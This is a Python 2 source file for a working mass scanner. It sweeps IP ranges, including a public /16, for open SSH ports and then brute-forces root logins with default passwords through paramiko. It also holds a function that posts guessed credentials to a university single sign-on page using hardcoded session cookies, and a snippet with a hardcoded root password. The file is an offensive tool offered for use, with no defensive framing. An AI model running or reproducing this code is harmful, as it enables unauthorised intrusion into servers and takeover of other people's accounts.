#coding=utf-8

import multi 
import socket 
"""

python
from multi import scan 
from testz.test import time
s = scan.TCPScan('172.0.0.0/20',22)
s = scan.TCPScan('192.168.0.1/19',22)
s = scan.TCPScan('125.71.215.223/16',22)
wx:101.227.160.102
s.mark_shows = False 
ips = time(s.work,False)[0]
ssh = scan.SSHScan(ips)
ssh.mark_shows = False 
logins = time(ssh.work,False)[0]


"""
class SSHScan(multi.Multi):
	def __init__(self, ips, user = 'root', pwds = ['123456'], loop_size = -1):
		super(SSHScan,self).__init__(True)
		size = len(ips)
		self.size = size
		self.user = user 
		self.pwds = pwds 
		self.ips = ips 
		if loop_size > 0:
			size = min(loop_size,size)
		for i in xrange(size):
			ip = ips[i]
			for pwd in pwds:
				attrs = self.attrs(ip,user,pwd)
				self.init_push(ssh_check, attrs, [ip,pwd])
		self.index = i + 1
		self.logins =[]
	def deal(self, response, remain, succeed):
		if self.index < self.size:
			ip = self.ips[self.index]
			attrs = self.attrs(ip,self.user, self.pwd)
			self.push(ssh_check,attrs,ip)
			self.index += 1
		if not succeed:
			print "error in ssh_check:",remain 
			return 
		if response:
			self.logins.append(remain) 
	def output(self):
		return self.logins

def ssh_check(ip, user, pwd):
	import paramiko
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(ip, 22, user, pwd)
		return True 
	except:
		return False
	finally: 
		ssh.close()
def ips(base, last):
	base = s2i(base)
	last = s2i(last)
	rst = range(base, last+1)
	return rst 

def ips_mark(ip):
	addr,mark = ip.strip().split("/")
	if mark == '':
		return [addr]
	i_mark = int(mark)
	i_addr = s2i(addr)
	i_nomark = 32 - i_mark 
	mark = 0xffffffff 
	mark = (mark >> i_nomark)<<i_nomark
	base_ip = i_addr & mark 
	size = 1 << i_nomark
	rst = []
	for i in xrange(size):
		ip = base_ip + i 
		ip = i2s(ip)
		rst.append(ip)
	return rst 

class TCPScan(multi.Multi):
	def __init__(self, ips, port, loop_size = -1, single_thread_for_feedback = True):
		super(TCPScan,self).__init__(single_thread_for_feedback)
		self.init_objs()
		self.ips = ips 
		self.size = len(ips)
		self.port = port
		size = self.size
		if loop_size > 0:
			size = min(loop_size,size)
		for i in xrange(size):
			ip = self.ips[i]
			attrs = self.attrs(ip,port)
			self.init_push(tcp_open, attrs, [ip, port])
		self.index = i + 1
		self.opens = []
	def deal(self, response, remain, succeed):
		if self.index < self.size:
			ip = self.ips[self.index ]
			attrs = self.attrs(ip,self.port)
			self.push(tcp_open,attrs,[ip,self.port])
			self.index += 1
		if not succeed:
			print "error in tcp_open:",remain 
			return 
		if response:
			self.opens.append(remain[0])
	def output(self):
		print "done"
		return self.opens

class TCPPortScan(multi.Multi):
	def __init__(self, ip, ports, max_threads = -1, loop_size = -1):
		if max_threads>0:
			self.max_threads = max_threads
		super(TCPPortScan,self).__init__(True)
		size = len(ports)
		self.size = size
		self.ip = ip
		self.ports = ports 
		if loop_size > 0:
			size = min(loop_size,size)
		for i in xrange(size):
			port = ports[i]
			attrs = self.attrs(ip, port)
			self.init_push(tcp_open, attrs, port)
		self.index = i + 1
		self.opens =[]
		self.dones = []
	def deal(self, response, remain, succeed):
		if self.index < self.size:
			port = self.ports[self.index]
			attrs = self.attrs(self.ip,port)
			self.push(tcp_open,attrs,port)
			self.index += 1
		if not succeed:
			print "error in tcp_open port:",remain 
			return 
		#print "port ",remain,":",response
		#if remain in [80, 443]:
		#	print 'ip:',self.ip,'port:',remain,'check:',tcp_open(self.ip, remain)
		self.dones.append(remain)
		if response:
			self.opens.append(remain)
	def output(self):
		return self.opens

def s2i(ip):
	ips = ip.strip().split('.')
	i_ip = 0 
	for ip in ips:
		tip = int(ip)
		i_ip = (i_ip<<8) + tip 
	return i_ip 

def i2s(ip):
	s = []
	for i in xrange(4):
		tip = ip & 0xff 
		s.append(tip)
		ip = ip >> 8
	ip = ''
	for i in s:
		ip = str(i) + '.' + ip
	ip = ip[:-1]
	return ip

# ip: addr/mark_size
# 

timeout = 1.5
def tcp_open(ip,port):
	global timeout
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.settimeout(timeout)
	try:
		server.connect((ip,port))
		return True
	except Exception as err:
		return False
	finally:
		server.close()


ssh = """
import paramiko
# 创建SSH对象
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh.connect('IP', 22, '用户名', key)
ssh.connect(hostname='192.168.158.131', port=22, username='root', password='hadoop')

stdin, stdout, stderr = ssh.exec_command('ls')
print stdout.read()

ssh.close()
"""

def login(user, pwd ):
    sdt = "IDToken0=&IDToken1="+user+"&IDToken2="+pwd+"&IDButton=Login&goto=aHR0cDovL2VoYWxsLnNjdS5lZHUuY24vYW1wLWF1dGgtYWRhcHRlci9sb2dpblN1Y2Nlc3M%2Fc2Vzc2lvblRva2VuPTEyZTI1YzA0ZGY5MDQyZmI5MGI2Njc2NDRlYTU4MWQ1&encoded=true&gx_charset=UTF-8"
    dt = { s.split("=")[0]:s.split("=")[1] for s in sdt.split("&")}
    url="http://ids.scu.edu.cn/amserver/UI/Login"
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
    refer="http://ids.scu.edu.cn/amserver/UI/Login?goto=http%3A%2F%2Fehall.scu.edu.cn%2Famp-auth-adapter%2FloginSuccess%3FsessionToken%3D12e25c04df9042fb90b667644ea581d5"
    import requests 
    scks= "_ga=GA1.3.1550360472.1536808174; safedog-flow-item=B9DA3CED5A93251085B22BFDBB4ED018; JROUTE=JCDS; JSESSIONID=D749364A1BA6287698E718A693B1804C; AMAuthCookie=AQIC5wM2LY4SfcwlnkzhaKrDLc8cbBqtJtdzfoCWEannqwQ%3D%40AAJTSQACMDE%3D%23; amlbcookie=01"
    cks = { s.split("=")[0].strip():s.split("=")[1].strip() for s in scks.split(";")}
    headers = { 'User-Agent' : user_agent , 'Refere': refer}
    response = requests.post(url, headers=headers, data = dt , cookies=cks)
    return len(response.text)!=2112,response
    return response
class TCPScan_backup(multi.Multi):
	def __init__(self, ip, port, loop_size = -1, single_thread_for_feedback = True):
		super(TCPScan,self).__init__(single_thread_for_feedback)
		self.init_objs()
		addr,mark = ip.strip().split("/")
		i_mark = int(mark)
		i_addr = s2i(addr)
		i_nomark = 32 - i_mark 
		mark = 0xffffffff 
		mark = (mark >> i_nomark)<<i_nomark
		base_ip = i_addr & mark 
		size = 1 << i_nomark
		print "szie:",size
		self.base_ip = base_ip 
		self.size = size
		self.port = port
		if loop_size > 0:
			size = min(loop_size,size)
		for i in xrange(size):
			ip = base_ip + i 
			ip = i2s(ip)
			attrs = self.attrs([ip,port])
			self.init_push(tcp_open, attrs, [ip, port])
		self.index = i + 1
		self.opens = []
	def deal(self, response, remain, succeed):
		if self.index < self.size:
			ip = self.base_ip + self.index 
			ip = i2s(ip)
			attrs = self.attrs([ip,self.port])
			self.push(tcp_open,attrs,[ip,self.port])
			self.index += 1
		if not succeed:
			print "error in tcp_open:",remain 
			return 
		if response:
			self.opens.append(remain[0])
	def output(self):
		print "done"
		return self.opens
